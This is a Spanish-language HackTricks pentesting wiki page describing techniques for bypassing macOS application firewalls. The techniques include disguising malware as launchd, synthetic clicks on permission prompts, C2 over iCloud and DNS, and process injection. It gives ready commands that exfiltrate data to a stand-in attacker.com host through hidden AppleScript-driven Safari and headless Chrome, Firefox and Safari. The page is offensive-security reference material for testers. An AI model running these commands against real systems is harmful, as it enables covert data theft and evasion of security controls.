# Bypass de Firewalls en macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue la [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Técnicas encontradas

Se encontraron las siguientes técnicas que funcionan en algunas aplicaciones de firewall de macOS.

### Abuso de nombres de lista blanca

* Por ejemplo, llamar al malware con nombres de procesos de macOS conocidos como **`launchd`**&#x20;

### Click sintético

* Si el firewall solicita permiso al usuario, hacer que el malware **haga clic en permitir**

### **Usar binarios firmados por Apple**

* Como **`curl`**, pero también otros como **`whois`**

### Dominios de Apple conocidos

El firewall podría permitir conexiones a dominios de Apple conocidos como **`apple.com`** o **`icloud.com`**. Y iCloud podría ser utilizado como C2.

### Bypass genérico

Algunas ideas para intentar eludir los firewalls

### Verificar el tráfico permitido

Conocer el tráfico permitido te ayudará a identificar dominios potencialmente en lista blanca o qué aplicaciones tienen permiso para acceder a ellos.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusando de DNS

Las resoluciones de DNS se realizan a través de la aplicación firmada **`mdnsreponder`**, la cual probablemente estará permitida para contactar con los servidores DNS.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### A través de aplicaciones de navegador

* **oascript**
```applescript
tell application "Safari"
    run
    tell application "Finder" to set visible of process "Safari" to false
    make new document
    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
*Google Chrome* es un navegador web popular que se utiliza en muchos sistemas operativos, incluyendo macOS. A menudo, los firewalls se configuran para bloquear el tráfico de red de Chrome, lo que puede ser un problema para los hackers que intentan establecer una conexión de red. Sin embargo, hay varias formas de evitar los firewalls y establecer una conexión exitosa con Chrome.
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### A través de inyecciones de procesos

Si puedes **inyectar código en un proceso** que tenga permiso para conectarse a cualquier servidor, podrías evadir las protecciones del firewall:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referencias

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
